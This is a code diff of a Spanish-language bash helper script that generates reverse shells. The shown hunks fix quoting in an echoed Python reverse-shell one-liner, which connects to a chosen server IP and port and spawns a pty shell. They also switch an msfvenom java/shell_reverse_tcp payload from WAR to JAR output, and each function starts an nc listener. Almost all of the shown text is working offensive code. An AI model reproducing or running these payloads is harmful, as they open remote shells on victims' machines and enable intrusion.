@@ -41,7 +41,7 @@ function r_php {
 #python
 function r_python {
     echo -e "\033[0;36m\nCópia lo siguiente para generarte la reverse shell!: \e[0m "
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$SERVER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
+    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$SERVER_IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
     nc -lnvp $PORT
 }
 
@@ -51,7 +51,7 @@ function r_java {
 
     if [ "$(echo $?)" == "0" ];
     then
-        msfvenom -p java/shell_reverse_tcp LHOST=$SERVER_IP LPORT=$PORT -f war -o shell.war
+        msfvenom -p java/shell_reverse_tcp LHOST=$SERVER_IP LPORT=$PORT -f jar -o shell.jar
         echo -e "[\033[0;32m+\e[0m] \033[0;36mArchivo con la reverse shell en java creado y listo para ejecutar!\e[0m"
         nc -lnvp $PORT
     else
